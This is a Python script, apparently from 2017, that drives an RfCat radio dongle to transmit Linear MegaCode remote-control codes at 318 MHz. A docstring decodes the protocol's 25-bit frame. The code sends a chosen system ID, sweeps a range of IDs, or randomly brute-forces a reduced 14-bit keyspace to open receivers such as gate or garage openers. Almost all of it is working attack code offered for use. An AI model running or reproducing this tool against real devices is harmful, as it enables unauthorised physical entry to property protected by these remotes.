#!/usr/bin/env python
#11/18/2017 rjmendez
'''
Reading the Linear protocol documentation describes a 6ms 25 bit-frame with individual 1ms symbols 

  sync      1      2      3      4      5      6      7      8      9     10     11     12     13     14     15     16     17     18     19     20     21     22     23
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
000001 000001 001000 000001 001000 000001 001000 000001 001000 001000 001000 000001 001000 000001 001000 000001 001000 001000 000001 000001 001000 001000 000001 001000 000000
     1      1     8       1      8      1      8      1      8      8      8      1      8      1      8      1      8      8      1      1      8      8      1      8    NUL

If 000001 = 1 and 001000 = 0:
110101010001010100110010NUL
D51532

Documentation describes frame 0 as the sync frame, 1-20 as system code, and 21-23 as data bits.

10101010001010100110 010
AA2A6 2
'''
import binascii, bitstring, sys, getopt, rflib, time, random

#Help
help_msg = '\nLinear Technologies MegaCode RfCat transmitter.\n\nUse this to transmit a single remote ID or iterate through a range.\nIDs are 20 bits and are provided as an integer between 1 and 1048575.\n    -s, --systemid    <integer between 1-1048575>\n    -l, --lower       <lower end of range>\n    -u, --upper       <upper end of range>\n    -r, --reduced     Attempts to randomly guess a key in the reduced 14 bit keyspace based on research from King Kevin at www.cuvoodoo.info\n\n'

#Radio stuff
frequency = 318000000
baudRate = 1000
keyLen = 0

def ConfigureD(d):
    d.setMdmModulation(rflib.MOD_ASK_OOK)
    d.setFreq(frequency)
    d.makePktFLEN(keyLen)
    d.setMdmDRate(baudRate)
    d.setMaxPower()
    d.lowball()
#Padding the input values.
def PadBytes(byte_length, hex_val):
    pad_num = byte_length-len(hex_val)
    if pad_num >= 1:
        pad_str = "0" * pad_num
        padded_hex_val = str(pad_str + hex_val)
        return padded_hex_val
    if pad_num == 0:
        #do nothing
        padded_hex_val = hex_val
        return padded_hex_val
    if pad_num < 0:
        print(str(hex_val))
        print('Invalid length of input, was expecting <= ' + str(byte_length) + ' but we got ' + str(len(hex_val)) + ' instead!')
        print(help_msg)
        quit()

def PacketValues(sysid, PacketLen):
    input_hex = PadBytes(PacketLen, str(hex(sysid)).lstrip("0x"))    
    return input_hex

def ValidateInput_sysid_single(sysid):
    if sysid >= 1048576:
        print("Invalid System ID Detected!")
        print(help_msg)
        quit()
    if sysid <= 1048575:
        return sysid

def ValidateInput_sysid_lower(sysid_lower, sysid_upper):
    if sysid_upper <= sysid_lower:
        print("Invalid Range Detected!\nUpper value must be greater than lower value!")
        print(help_msg)
        quit()
    if sysid_upper >= 1048576:
        print("Invalid System ID Detected!")
        print(help_msg)
        quit()
    if sysid_lower >= 1:
        return sysid_lower


def ValidateInput_sysid_upper(sysid_lower, sysid_upper):
    if sysid_upper <= sysid_lower:
        print("Invalid Range Detected!\nUpper value must be greater than lower value!")
        print(help_msg)
        quit()
    if sysid_upper >= 1048576:
        print("Invalid System ID Detected!")
        print(help_msg)
        quit()
    if sysid_upper <= 1048575:
        return sysid_upper

#Bytes to Bits ascii stream.
def byte_to_binary(n):
    return ''.join(str((n & (1 << i)) and 1) for i in reversed(range(8)))
#Hex to Bytes.
def hex_to_binary(h):
    return ''.join(byte_to_binary(ord(b)) for b in binascii.unhexlify(h))

def FormatBitFrame(input_bin):
    output_bin = ''
    for bit in input_bin:
        if bit == '0':
            output_bin += '001000'
        elif bit == '1':
            output_bin += '000001'
        else:
            print("lolwut?")
    return output_bin

def TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail):
    #sync_frame = "000001"
    #data_frame = "001000000001001000" #value = 2
    #null_tail  = "000000"
    rf_data = bitstring.BitArray(bin=sync_frame+output_bin+data_frame+null_tail).tobytes()
    keyLen = len(rf_data)
    #Transmit here.
    print('Sending packet payload: ' + input_hex + '2' + ' System ID: ' + str(int(input_hex, 16)))
    d.RFxmit(rf_data)
    print('-'*40)


def main(argv):
    data = 1
    rxid = ''
    sysid = ''
    sysid_lower = False
    sysid_upper = False
    sysid_range = False
    sysid_single = False
    reduced_keyspace = False
    input_hex = ''
    output_hex = ''
    
    try:
        opts, args = getopt.getopt(argv,"hl:u:s:r",["lower=","upper=","systemid","reduced"])
    except getopt.GetoptError as error:
        print(error)
        print(help_msg)
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print(help_msg)
            sys.exit()
        elif opt in ("-l", "--lower"):
            sysid_lower = int(arg)
            sysid_single = False
        elif opt in ("-u", "--upper"):
            sysid_upper = int(arg)
            sysid_single = False
        elif opt in ("-s", "--systemid"):
            sysid = int(arg)
            sysid_range = False
            sysid_single = True
        elif opt in ("-r", "--reduced"):
            reduced_keyspace = True
            sysid_single = False
            sysid_range = False
            sysid_lower = 1
            sysid_upper = 16383

    if len(sys.argv) == 1:
        print('Invalid input, program accepts the following input format:\n' + help_msg)
        sys.exit(2)

    if (sysid_lower or sysid_upper) and sysid:
        print('Invalid input, cannot accept range AND single System ID!')
    if (sysid_lower and sysid_upper) and not reduced_keyspace:
        print('Generating System ID ' + str(sysid_lower) + ' through ' + str(sysid_upper))
        sysid_range = True
        sysid_single = False
    if not (sysid_lower and sysid_upper) and sysid:
        print('Sending single System ID ' + str(sysid))
        sysid_range = False
    if (sysid_lower and sysid_upper) and reduced_keyspace:
        print('Generating System ID ' + str(sysid_lower) + ' through ' + str(sysid_upper))
        sysid_range = False
        sysid_single = False


    if sysid_single:
        sysid = ValidateInput_sysid_single(sysid)
        #Generate packet hex
        input_hex = PacketValues(sysid, 6)
        #Convert hex to binary ascii stream
        input_bin = hex_to_binary(input_hex)
        input_bin = input_bin[4:] #Removing extra null byte
        output_bin = FormatBitFrame(input_bin)
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        sync_frame = "000001"
        data_frame = "001000000001001000" #value = 2
        null_tail  = "000000"
        TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail)
        time.sleep(0.01)
        d.setModeIDLE()
        print('Done!')
        quit()

    if sysid_range:
        sysid_lower = ValidateInput_sysid_lower(sysid_lower, sysid_upper)
        sysid_upper = ValidateInput_sysid_upper(sysid_lower, sysid_upper)
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        sync_frame = "000001"
        data_frame = "001000000001001000" #value = 2
        null_tail  = "000000"
        for i in range(sysid_lower, sysid_upper+1, 1):
            #Generate packet hex
            input_hex = PacketValues(i, 6)
            #Convert hex to binary ascii stream
            input_bin = hex_to_binary(input_hex)
            input_bin = input_bin[4:] #Removing extra null byte
            output_bin = FormatBitFrame(input_bin)
            TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail)
            time.sleep(0.005)
        d.setModeIDLE()
        print('Done!')
        quit()

    if reduced_keyspace:
        sysid_lower = ValidateInput_sysid_lower(sysid_lower, sysid_upper)
        sysid_upper = ValidateInput_sysid_upper(sysid_lower, sysid_upper)
        #print('Configuring RfCat...')
        d = rflib.RfCat()
        d.setModeIDLE()
        #print('Configuring Radio...')
        ConfigureD(d)
        sync_frame = "000001 000001 001000 000001 001000"
        data_frame = "001000 001000 001000 000001 001000" #value = 2
        null_tail  = "000000"
        rand_list = list(range(sysid_lower, sysid_upper+1, 1))
        random.shuffle(rand_list)
        for i in rand_list:
            #Generate packet hex
            input_hex = PacketValues(i, 6)
            #Convert hex to binary ascii stream
            input_bin = hex_to_binary(input_hex).lstrip("0")
            #print(input_bin + ' ' + str(len(input_bin)))
            input_bin = PadBytes(14, input_bin)
            #print(input_bin + ' ' + str(len(input_bin)))
            output_bin = FormatBitFrame(input_bin)
            TransmitData(output_bin, input_hex, d, sync_frame, data_frame, null_tail)
            time.sleep(0.005)
        d.setModeIDLE()
        print('Done!')
        quit()

    if not [sysid_range, sysid_single, reduced_keyspace]:
        print('Incomplete parameters specified!')
        print(help_msg)

if __name__ == "__main__":
    main(sys.argv[1:])

